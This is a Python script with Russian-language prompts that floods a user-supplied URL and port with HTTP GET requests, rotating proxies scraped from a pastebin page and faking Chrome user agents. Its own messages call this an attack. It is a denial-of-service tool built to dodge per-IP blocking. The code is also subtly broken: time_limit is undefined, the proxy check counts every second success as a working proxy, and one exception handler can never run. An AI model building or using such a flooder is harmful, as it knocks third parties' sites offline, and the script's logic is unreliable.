import requests
from bs4 import BeautifulSoup
import time
import random
from fake_useragent import UserAgent

req_per_ip = 65

def get_proxies():
    url = 'https://pastebin.com/kKiVLZs4'
    response = requests.get(url)
    
    soup = BeautifulSoup(response.content, 'html.parser')
    proxy_list = soup.text.split('\n')
    
    proxies = [proxy for proxy in proxy_list if proxy]
    
    return proxies

def generate_user_agent():
    user_agent = UserAgent()
    return user_agent.chrome

def send_req(time_limit, threads, target, concurrent):
    proxies = get_proxies()

    if not proxies:
        print('No proxies available.')
        return

    start_time = time.time()
    end_time = start_time + time_limit
    requests_sent = 0
    working_proxies = []

    # Проверка прокси
    print('Проверка прокси...')
    for proxy in proxies:
        try:
            headers = {'User-Agent': generate_user_agent()}
            response = requests.get(target, headers=headers, proxies={'http': proxy, 'https': proxy}, timeout=2)
            requests_sent += 1

            if requests_sent % 2 == 0:
                working_proxies.append(proxy)
                print(f'Прокси {proxy} работает')

            if time.time() >= end_time:
                break
        except requests.exceptions.RequestException as e:
            print(f'Прокси {proxy} не работает:', e)
        except requests.exceptions.Timeout:
            print(f'Прокси {proxy} не отвечает')

    print(f'Количество рабочих прокси: {len(working_proxies)}\n')

    # Отправка запросов
    print('Отправка запросов...')
    while time.time() < end_time:
        for _ in range(threads):
            if not working_proxies:
                print('No working proxies available.')
                break

            proxy = random.choice(working_proxies)
            
            try:
                headers = {'User-Agent': generate_user_agent()}
                response = requests.get(target, headers=headers, proxies={'http': proxy, 'https': proxy}, timeout=2)
                print('Request sent')
            except requests.exceptions.RequestException as e:
                print('Error:', e)
            except requests.exceptions.Timeout:
                print('Proxy timed out:', proxy)
            
            time.sleep(1/concurrent)

    print('Атака завершена.')

def start_attack():
    target = input('Введите URL для атаки: ')
    port = input('Введите порт: ')
    threads = int(input('Введите количество потоков: '))
    concurrent = int(input('Введите скорость атаки (количество запросов в секунду): '))

    target_url = f'http://{target}:{port}'
    print(f'Атака запущена на {target_url} в течение {time_limit} секунд с {threads} потоками и {req_per_ip} запросов на IP.')
    send_req(time_limit, threads, target_url, concurrent)

start_attack()
